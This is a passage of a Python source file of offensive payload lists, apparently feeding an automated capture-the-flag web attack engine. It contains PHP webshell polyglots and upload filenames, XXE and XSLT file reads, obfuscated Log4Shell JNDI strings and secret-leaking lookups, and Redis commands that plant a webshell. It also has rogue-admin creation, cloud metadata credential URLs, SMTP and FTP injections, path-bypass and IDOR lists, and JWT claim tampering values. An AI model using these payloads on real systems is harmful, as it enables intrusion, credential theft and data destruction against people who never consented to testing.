    "shell.php", "shell.php5", "shell.php7", "shell.phtml", "shell.pht",
    "shell.phar", "shell.phP", "shell.Php", "shell.php.jpg", "shell.jpg.php",
    "shell.php%00.jpg", "shell.php\x00.jpg", "shell.php.", "shell.php..",
    "shell.PHP", "shell.pHp", "shell.php3", "shell.php4", "shell.phps",
    "shell.js", "shell.jsp", "shell.jspx", "shell.asp", "shell.asa",
    "shell.cer", "shell.aspx", "shell.shtml", "shell.html", "shell.svg",
    "shell.htaccess", ".htaccess", "shell.user.ini", ".user.ini",
    # magic bytes prefix (jpg header + php code)
    "\xff\xd8\xff\xe0<?php system('cat /flag');?>",
    "GIF89a<?php system('cat /flag');?>",
    "\x89PNG\r\n\x1a\n<?php system($_GET['c']);?>",
    "\x00\x00\x00\x20ftypmp4<?php system('cat /flag');?>",
    # svg xss/xxe
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
    "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///flag'>]><svg xmlns='http://www.w3.org/2000/svg'><text>&x;</text></svg>",
    # polyglot
    "PK\x03\x04<?php system('cat /flag');?>",
    "BJFIF<?php system('cat /flag');?>",
]

# ============================================================================
# XSLT INJECTION — 12
# ============================================================================

XSLTI = [
    "<xsl:value-of select=\"system-property('xsl:version')\"/>",
    "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"unparsed-text('/flag')\"/></xsl:template></xsl:stylesheet>",
    "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:sys=\"http://xml.apache.org/xalan/java/java.lang.System\"><xsl:template match=\"/\"><xsl:value-of select=\"sys:getenv('PATH')\"/></xsl:template></xsl:stylesheet>",
    "<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>",
    "<xsl:value-of select=\"system-property('xsl:vendor')\"/>",
    "<xsl:value-of select=\"read-file('/flag')\"/>",
]

# ============================================================================
# LOG4SHELL / JNDI — 20+
# ============================================================================

LOG4SHELL = [
    "${jndi:ldap://127.0.0.1/x}", "${jndi:rmi://127.0.0.1/x}",
    "${jndi:dns://127.0.0.1/x}", "${jndi:ldap://127.0.0.1:1389/x}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1/x}",
    "${${lower:j}ndi:ldap://127.0.0.1/x}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://127.0.0.1/x}",
    "${j${k8:print:}ndi:ldap://127.0.0.1/x}",
    "${j${::-n}di:ldap://127.0.0.1/x}",
    "${${env:BARFOO:-j}ndi:ldap://127.0.0.1/x}",
    "${jn${env:BARFOO:-d}i:ldap://127.0.0.1/x}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/x}",
    "${${date:yyyy-MM-dd}jndi:ldap://127.0.0.1/x}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${env:HOSTNAME}.x/}",
    # log4j env leaks
    "${env:PATH}", "${env:FLAG}", "${env:flag}", "${sys:user.dir}",
    "${sys:java.version}", "${java:os}", "${date:yyyy}",
    "${web:rootDir}", "${docker:containerName}",
    "${env:AWS_SECRET_ACCESS_KEY}",
    # other JNDI-able apps
    "${jndi:ldap://127.0.0.1/x}", "${script:javascript:7*7}",
    "#{7*7}", "${7*7}", "${Runtime.getRuntime().exec(\"id\")}",
]

# ============================================================================
# CRLF / HEADER INJECTION — 15
# ============================================================================

CRLF = [
    "%0d%0aSet-Cookie:x=y", "%0aSet-Cookie:x=y", "\r\nSet-Cookie: x=y",
    "%0d%0aLocation:http://127.0.0.1", "%0d%0aX-Injected:x",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:5%0d%0a%0d%0aPWNED",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%%0d0aSet-Cookie:x=y", "%250d250aSet-Cookie:x=y",
    "%0d%0aX-Forwarded-For:127.0.0.1",
    "%0d%0aSet-Cookie:admin=true",
]

# ============================================================================
# TEMPLATE / FORMAT — format string & misc injection — 30+
# ============================================================================

FMT = [
    # c format string
    "%s%s%s%s%s%s%s%s%s%s", "%x %x %x %x %x %x %x %x %x %x",
    "%p %p %p %p %p %p %p %p %p %p", "%n%n%n%n", "%9999999d%n",
    "%9999999x%n%n%n%n", "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x",
    "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
    "%1337$p", "%c%p%p", "%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p",
    "%40$s", "%100$p", "%1$s %2$s %3$s",
    # python format string
    "{0.__class__}", "{0.__init__.__globals__}", "{self.__init__.__globals__}",
    "{config}", "{config.items()}", "{app.secret_key}", "{request.environ}",
    "{0[SECRET_KEY]}", "{file.__class__.__init__.__globals__}",
    "{.__class__}", "{x.__class__.__base__.__subclasses__()}",
    # java messageformat
    "{0}", "{1}", "{0, date}", "{0, number}",
    # ruby format
    "%s %s %s", "#{7*7}", "%001000d",
    # .NET string.Format
    "{0:x}", "{1:x}", "{0:this}", "{0:file}",
]

# ============================================================================
# HTTP REQUEST SMUGGLING markers — 10 (cl-te / te-cl lengths)
# ============================================================================

SMUGGLE = [
    "CL.TE-marker: 1",  # engine builds actual smuggled bodies
    "TE.CL-marker: 1",
]

# ============================================================================
# LDAP INJECTION standalone — 15 (distinct from nosql ldap section)
# ============================================================================

LDAP = [
    "*", "*(", "*)(", "*)(", "*()|&'", "*))%00",
    "admin)(&(password=*)", "admin)(|(password=*)", "*)(&",
    "*)(objectClass=*))(", "admin*)(&", "*|", "*)(|",
    "(&(uid=*)(uid=*))", "(|(uid=*)(cn=*))", "\\\\*",
    "*)(uid=*))(|(uid=*", ")(cn=*))(|(cn=*",
]

# ============================================================================
# CACHING / RACE / OAUTH misc — 15
# ============================================================================

MISC = [
    # web cache deception
    "/login.css", "/profile.css", "/admin.css", "/api/user.json",
    "/nonexistent.js", "/home/x.css",
    # oauth
    "response_type=token", "redirect_uri=http://127.0.0.1",
    "state=", "code=x", "client_id=x&redirect_uri=//127.0.0.1",
    # race-friendly params (single request probes)
    "amount=0.00001", "qty=-1", "qty=0", "balance=-999999",
    "price=0", "discount=100", "coupon=x100", "count=999999999",
]

# ============================================================================
# DATABASE DIRECT — commands to send when you land on a raw DB port
# ============================================================================

DB_REDIS = [
    "PING", "INFO", "CONFIG GET *", "CONFIG GET dir", "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php", "SET x '<?php system($_GET[\"c\"]);?>'",
    "SAVE", "KEYS *", "GET flag", "GET FLAG", "MGET flag flag.txt",
    "TYPE flag", "LRANGE flag 0 -1", "SMEMBERS flag", "HGETALL flag",
    "ZRANGE flag 0 -1", "GETRANGE flag 0 -1", "STRLEN flag",
    "FLUSHALL", "DEBUG SEGFAULT", "SLAVEOF 127.0.0.1 6379",
    "MODULE LOAD /tmp/x.so", "EVAL 'return 1' 0",
    "SCRIPT LOAD 'return 1'", "CLIENT LIST", "DBSIZE",
    "SELECT 0", "SELECT 1", "SCAN 0", "RANDOMKEY",
]

DB_MEMCACHED = [
    "version", "stats", "stats items", "stats slabs", "stats settings",
    "get flag", "get flag_1", "get FLAG", "get flag:1",
    "set x 0 0 1\na", "gets flag", "delete flag",
    "flush_all", "verbosity", "lru_crawler metadump all",
    "stats cachedump 1 100", "stats conns", "watch fetchers",
]

DB_MONGO = [
    "db.adminCommand({listDatabases:1})", "db.getCollectionNames()",
    "db.users.find()", "db.users.find().pretty()",
    "db.flags.find()", "db.flag.find()", "db.getSiblingDB('flag').flag.find()",
    "db.users.find({},{password:1})", "db.adminCommand({getLog:'global'})",
    "db.stats()", "show dbs", "use admin", "db.createUser({user:'x',pwd:'x',roles:['root']})",
]

# ============================================================================
# PROTOCOL INJECTION — raw socket services
# ============================================================================

SMTP_INJECT = [
    "MAIL FROM:<x@x>", "RCPT TO:<admin@localhost>",
    "RCPT TO:<x@x>\r\nDATA\r\nSubject: pwn\r\n\r\nbody\r\n.\r\n",
    "%0d%0aDATA%0d%0a", "x@x\r\nBCC:attacker@x",
    "x\r\nRCPT TO:<root@localhost>", ".\r\nQUIT",
    "VRFY root", "EXPN root", "EXPN /etc/passwd",
    "RCPT TO:<$(cat /flag)@x>", "RCPT TO:<`cat /flag`@x>",
    "MAIL FROM:<' OR 1=1--@x>",
]

FTP_INJECT = [
    "PORT 127,0,0,1,0,80", "PASV", "RETR /flag", "RETR /etc/passwd",
    "STOR x", "SITE EXEC id", "SITE CHMOD 777 /flag",
    "CWD ../../../", "LIST ../../../", "MKD x", "DELE /flag",
    "USER anonymous", "PASS anonymous", "SYST", "FEAT",
    "SIZE /flag", "MDTM /flag", "RNFR /flag",
]

POP_IMAP = [
    "USER admin", "PASS x", "LIST", "RETR 1", "TOP 1 0",
    "a LOGIN admin x", "a SELECT INBOX", "a FETCH 1 BODY[]",
    "a LIST '' '*'", "a STATUS INBOX (messages)", "a FETCH 1:10 FLAGS",
]

# ============================================================================
# CLOUD METADATA — full AWS/GCP/Azure/Alibaba surface
# ============================================================================

CLOUD_META = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "http://169.254.169.254/computeMetadata/v1/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    # kubernetes
    "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    "http://169.254.169.254/latest/meta-data/hostname",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
]

# ============================================================================
# RACE CONDITION — parameter sets for parallel-fire testing
# ============================================================================

RACE = [
    # markers: engine fires N parallel requests with these exact bodies
    "RACE:gift=1", "RACE:withdraw=100", "RACE:vote=1", "RACE:coupon=ONCE",
    "RACE:transfer=100", "RACE:like=1", "RACE:claim=1", "RACE:spin=1",
    "RACE:checkout=1", "RACE:refund=1", "RACE:signup=1", "RACE:reset=1",
]

# ============================================================================
# CORS / POSTMESSAGE probes
# ============================================================================

CORS = [
    # value to put in Origin header
    "http://evil.com", "null", "https://google.com",
    "http://127.0.0.1:8080", "https://target.evil.com",
    "http://sub.target.com", "https://target.com.evil.com",
]

# ============================================================================
# IDOR — object id patterns to swap in params/paths
# ============================================================================

IDOR = [
    # swap target param value with these
    "1", "2", "3", "0", "-1", "admin", "root", "me", "self",
    "1.json", "1.xml", "1.html", "user1", "u1", "id1",
    "1000", "1001", "9999", "12345", "uuid-1", "a", "%00",
    "../1", "..", "1/", "1%00", "true", "false", "null",
    "0001", "01", "+1", " 1", "1 ", "1.0", "1e0",
]

# ============================================================================
# HTTP PATH / ROUTE BYPASS — path confusion to reach hidden routes
# ============================================================================

PATHBYPASS = [
    "/admin", "/admin/", "/admin..;/", "/admin/", "/./admin", "//admin",
    "/;/admin", "/admin%20", "/admin%00", "/admin#", "/admin?x=1",
    "/Admin", "/ADMIN", "/admin.json", "/admin/", "/%2e/admin",
    "/%2f%2f/admin", "/admin/..;/", "/..;/admin", "/;/admin",
    "/api/admin", "/api/v1/admin", "/api/internal", "/internal",
    "/debug", "/console", "/actuator", "/actuator/env",
    "/actuator/heapdump", "/actuator/configprops", "/actuator/beans",
    "/swagger", "/swagger-ui.html", "/api-docs", "/graphql",
    "/.env", "/.git/config", "/.git/HEAD", "/config.php.bak",
    "/backup.sql", "/db.sql", "/dump.sql", "/flag", "/flag.txt",
    "/server-status", "/phpinfo.php", "/info.php", "/test.php",
    "/wp-admin", "/administrator", "/manager/html", "/solr/admin",
    "/metrics", "/health", "/status", "/trace", "/env",
    "/api/v1/users", "/api/v2/users", "/v1/admin", "/v2/admin",
]

# ============================================================================
# MAGIC BYTE / FILETYPE confusion content
# ============================================================================

FILECONF = [
    # crafted file contents that trigger parser-specific bugs
    "#EXTM3U\n<?php system('cat /flag');?>",  # m3u playlist + php
    "%!PS\n(id) pop\n",  # postscript exec
    "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\nx\ntrailer<</Root 1 0 R>>",
    "RIFF\x00\x00\x00\x00WEBPVP8 ",  # riff header
    "\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom",
    "OggS\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00",
    "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03",  # gzip
    "BZh9\x31\x41\x59\x26\x53\x59",  # bzip2 magic
    "\xfd7zXZ\x00",  # xz
    "\x7fELF\x02\x01\x01\x00",  # elf
    "\xca\xfe\xba\xbe",  # java class
    "\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",  # ole/msdoc
    "[{\"a\":1},{\"a\":2}]",  # json array bombs for weak parsers
    "{\"a\":1e999999999}",  # float overflow json
    "{\"a\":" + "{\"b\":" * 100 + "1" + "}" * 100 + "}",  # nested depth
]

# ============================================================================
# OAUTH/JWT claim wordlist — keys worth flipping when you can edit tokens
# ============================================================================

CLAIM_KEYS = [
    "admin", "isAdmin", "is_admin", "role", "roles", "group", "groups",
    "permissions", "scope", "scopes", "privilege", "privileges",
    "level", "access", "access_level", "user_type", "userType",
    "verified", "email_verified", "active", "enabled", "staff",
    "moderator", "superuser", "authorities", "aud", "sub",
]

CLAIM_VALS = [
    "true", "admin", "superuser", "root", "*", "all", "1",
    "[\"admin\"]", "[\"*\"]", "{\"role\":\"admin\"}",
    "admin,superuser", "user,admin",
]

